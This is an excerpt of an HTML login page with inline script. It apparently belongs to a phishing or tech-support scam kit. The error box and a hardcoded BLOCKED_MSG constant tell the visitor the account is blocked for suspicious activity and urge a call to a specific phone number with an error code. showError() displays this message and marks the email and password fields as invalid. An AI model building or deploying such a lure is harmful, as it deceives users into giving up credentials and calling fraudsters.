...
<body>
    ...
    <div class="right">
        <form id="loginForm" novalidate  method="POST" action="">
            ...
            <div id="errorBox" class="error" role="alert" aria-live="assertive" aria-atomic="true">
                ...
                Due to suspicious activity, your account has been blocked. Please contact our customer service at
                <strong>+1877-334-0352</strong>. Error code <strong>E902</strong>
            </div>
            ...
            <div class="buttons">
                ...
                <button type="button" class="btn btn-outline">Help</button>
            </div>

            <div class="divider-row">or</div>

            <button type="button" class="passkey"><img src="lock.png" alt="" style="width: 10px; height: 12px;"> Log in
                with passkeys</button>
    ...
    <script>
        ...
        const BLOCKED_MSG = "Due to suspicious activity, your account has been blocked. Please contact our customer service at +1877-334-0352. Error code E902";

        function showError(msg) {
            // set message and show
            errorBox.innerHTML = `<strong>Account blocked</strong>${msg}`;
            errorBox.style.display = "block";

            // add visual input errors
            email.classList.add("input-error");
            password.classList.add("input-error");

            // move focus to error box for screen readers (but preserve scroll)
